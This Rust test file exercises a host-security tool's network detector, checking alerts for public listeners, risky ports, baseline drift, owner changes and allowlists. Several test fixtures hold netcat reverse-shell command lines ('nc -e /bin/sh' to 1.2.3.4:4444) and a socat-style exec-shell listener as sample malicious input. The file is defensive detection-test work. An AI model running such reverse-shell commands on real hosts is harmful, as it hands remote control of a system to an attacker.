use super::{is_public_addr, NetworkDetector};
use crate::detectors::{DetectContext, Detector};
use sentinel_core::{RawEvent, SentinelConfig};
use std::sync::Arc;

#[test]
fn suppresses_expected_web_ports() {
    let findings = detect_with_default_config(vec![socket_event("network", 443)]);
    assert!(findings.is_empty());
}

#[test]
fn classifies_public_listener_addresses_without_loopback_noise() {
    assert!(is_public_addr("0.0.0.0"));
    assert!(is_public_addr("::"));
    assert!(is_public_addr("8.8.8.8"));
    assert!(is_public_addr("2001:4860:4860::8888"));
    assert!(!is_public_addr("127.0.0.1"));
    assert!(!is_public_addr("::1"));
    assert!(!is_public_addr("10.0.0.10"));
    assert!(!is_public_addr("172.16.1.10"));
    assert!(!is_public_addr("192.168.1.10"));
    assert!(!is_public_addr("fd00::1"));
    assert!(!is_public_addr("fe80::1"));
}

#[test]
fn ignores_ipv6_loopback_listener_baseline_drift() {
    let findings = detect_with_default_config(vec![RawEvent::new("baseline", "listening_socket")
        .with_field("protocol", "tcp6")
        .with_field("local_addr", "::1")
        .with_field("local_port", "6379")
        .with_field("process_name", "redis")
        .with_field("executable", "/usr/bin/redis-server")]);
    assert!(findings.is_empty());
}

#[test]
fn reports_specific_public_ip_high_risk_listener() {
    let findings = detect_with_default_config(vec![RawEvent::new("network", "listening_socket")
        .with_field("protocol", "tcp")
        .with_field("local_addr", "8.8.8.8")
        .with_field("local_port", "6379")
        .with_field("process_name", "redis")
        .with_field("executable", "/usr/bin/redis-server")]);
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "CONFIG-003");
}

#[test]
fn suppresses_stable_generic_public_ports_without_baseline_drift() {
    let findings = detect_with_default_config(vec![socket_event("network", 4444)]);
    assert!(findings.is_empty());
}

#[test]
fn reports_new_public_port_from_baseline_drift() {
    let findings = detect_with_default_config(vec![socket_event("baseline", 4444)]);
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "NET-001");
}

#[test]
fn suppresses_generic_udp_high_port_from_baseline_drift() {
    let findings = detect_with_default_config(vec![udp_socket_event("baseline", 51659)]);
    assert!(findings.is_empty());
}

#[test]
fn reports_high_risk_udp_public_port() {
    let findings = detect_with_default_config(vec![udp_socket_event("network", 11211)]);
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "CONFIG-003");
}

#[test]
fn reports_suspicious_udp_listener_process() {
    let findings = detect_with_default_config(vec![RawEvent::new("network", "listening_socket")
        .with_field("protocol", "udp6")
        .with_field("local_addr", "::")
        .with_field("local_port", "51659")
        .with_field("process_name", "sh")
        .with_field("executable", "/tmp/.x/sh")
        .with_field("cmdline", "sh -c nc -u -e /bin/sh 1.2.3.4 4444")]);
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "NET-003");
}

#[test]
fn reports_suspicious_process_on_expected_web_port() {
    let findings = detect_with_default_config(vec![RawEvent::new("network", "listening_socket")
        .with_field("protocol", "tcp")
        .with_field("local_addr", "0.0.0.0")
        .with_field("local_port", "443")
        .with_field("process_name", "sh")
        .with_field("executable", "/tmp/.x/sh")
        .with_field("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444")]);
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "NET-003");
}

#[test]
fn ignores_plain_forwarding_command_on_expected_port() {
    let findings = detect_with_default_config(vec![RawEvent::new("network", "listening_socket")
        .with_field("protocol", "tcp")
        .with_field("local_addr", "0.0.0.0")
        .with_field("local_port", "443")
        .with_field("process_name", "forwarder")
        .with_field("executable", "/usr/bin/forwarder")
        .with_field("cmdline", "forwarder tcp-listen:8443 tcp:example.com:443")]);
    assert!(findings.is_empty());
}

#[test]
fn command_allowlist_suppresses_listener_process_risk() {
    let mut config = SentinelConfig::default();
    config
        .allowlist
        .process_command_contains
        .push("trusted-forwarder".to_string());
    let findings = detect(
        config,
        vec![RawEvent::new("network", "listening_socket")
            .with_field("protocol", "tcp")
            .with_field("local_addr", "0.0.0.0")
            .with_field("local_port", "443")
            .with_field("process_name", "sh")
            .with_field("executable", "/tmp/.x/sh")
            .with_field("cmdline", "trusted-forwarder tcp-listen:443 exec:/bin/sh")],
    );
    assert!(findings.is_empty());
}

#[test]
fn reports_non_suspicious_owner_change_on_expected_web_port() {
    let findings = detect_with_default_config(vec![RawEvent::new(
        "baseline",
        "listening_socket_owner_changed",
    )
    .with_field("protocol", "tcp")
    .with_field("local_addr", "0.0.0.0")
    .with_field("local_port", "443")
    .with_field("process_name", "caddy")
    .with_field("executable", "/usr/bin/caddy")
    .with_field("previous_process_name", "nginx")
    .with_field("previous_executable", "/usr/sbin/nginx")]);
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "NET-002");
}

#[test]
fn owner_change_with_systemd_execstart_mismatch_is_suspicious_listener() {
    let socket = RawEvent::new("baseline", "listening_socket_owner_changed")
        .with_field("protocol", "tcp")
        .with_field("local_addr", "0.0.0.0")
        .with_field("local_port", "443")
        .with_field("pid", "42")
        .with_field("process_name", "kworker")
        .with_field("executable", "/tmp/.x/kworker")
        .with_field("previous_process_name", "nginx")
        .with_field("previous_executable", "/usr/sbin/nginx");
    let process = RawEvent::new("process", "process_snapshot")
        .with_field("pid", "42")
        .with_field("systemd_unit", "nginx.service")
        .with_field("systemd_execstart", "/usr/sbin/nginx -g 'daemon off;'")
        .with_field("exe_hash_blake3", "abc123");

    let findings = detect_with_default_config(vec![socket, process]);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "NET-003");
    assert!(findings[0]
        .evidence
        .iter()
        .any(|item| item.key == "systemd_unit" && item.value == "nginx.service"));
    assert!(findings[0].evidence.iter().any(|item| {
        item.key == "risk_features" && item.value.contains("systemd_execstart_mismatch")
    }));
}

#[test]
fn reports_high_risk_public_port_from_current_state() {
    let findings = detect_with_default_config(vec![socket_event("network", 6379)]);
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "CONFIG-003");
    assert!(findings[0]
        .evidence
        .iter()
        .any(|item| item.key == "service_profile" && item.value == "Redis"));
}

#[test]
fn high_risk_public_port_includes_firewall_context_when_available() {
    let findings = detect_with_default_config(vec![
        socket_event("network", 6379),
        RawEvent::new("firewall", "firewall_state")
            .with_field("status", "active")
            .with_field("sources", "nftables, iptables"),
    ]);

    assert_eq!(findings.len(), 1);
    assert!(findings[0]
        .evidence
        .iter()
        .any(|item| item.key == "firewall_status" && item.value == "active"));
}

#[test]
fn high_risk_public_port_dedup_ignores_firewall_source_churn() {
    let first = detect_with_default_config(vec![
        socket_event("network", 6379),
        RawEvent::new("firewall", "firewall_state")
            .with_field("status", "active")
            .with_field("sources", "iptables"),
    ]);
    let second = detect_with_default_config(vec![
        socket_event("network", 6379),
        RawEvent::new("firewall", "firewall_state")
            .with_field("status", "active")
            .with_field("sources", "nftables, iptables"),
    ]);

    assert_eq!(first.len(), 1);
    assert_eq!(second.len(), 1);
    assert_eq!(first[0].rule_id, "CONFIG-003");
    assert_eq!(first[0].dedup_key, second[0].dedup_key);
}

#[test]
fn reports_suspicious_process_on_high_risk_port_as_one_behavior_alert() {
    let findings = detect_with_default_config(vec![RawEvent::new("network", "listening_socket")
        .with_field("protocol", "tcp")
        .with_field("local_addr", "0.0.0.0")
        .with_field("local_port", "6379")
        .with_field("process_name", "sh")
        .with_field("executable", "/tmp/.x/sh")
        .with_field("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444")]);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "NET-003");
    assert!(findings[0]
        .evidence
        .iter()
        .any(|item| item.key == "service_profile" && item.value == "Redis"));
}

#[test]
fn allowlist_suppresses_high_risk_public_port() {
    let mut config = SentinelConfig::default();
    config.allowlist.listening_ports.push(6379);
    let findings = detect(config, vec![socket_event("network", 6379)]);
    assert!(findings.is_empty());
}

fn detect_with_default_config(events: Vec<RawEvent>) -> Vec<sentinel_core::Finding> {
    detect(SentinelConfig::default(), events)
}

fn detect(config: SentinelConfig, events: Vec<RawEvent>) -> Vec<sentinel_core::Finding> {
    let detector = NetworkDetector;
    let ctx = DetectContext::new(Arc::new(config));
    detector.detect(&events, &ctx)
}

fn socket_event(source: &str, port: u16) -> RawEvent {
    RawEvent::new(source, "listening_socket")
        .with_field("protocol", "tcp")
        .with_field("local_addr", "0.0.0.0")
        .with_field("local_port", port.to_string())
}

fn udp_socket_event(source: &str, port: u16) -> RawEvent {
    RawEvent::new(source, "listening_socket")
        .with_field("protocol", "udp6")
        .with_field("local_addr", "::")
        .with_field("local_port", port.to_string())
        .with_field("process_name", "v2ray")
        .with_field("executable", "/usr/bin/v2ray/v2ray")
}
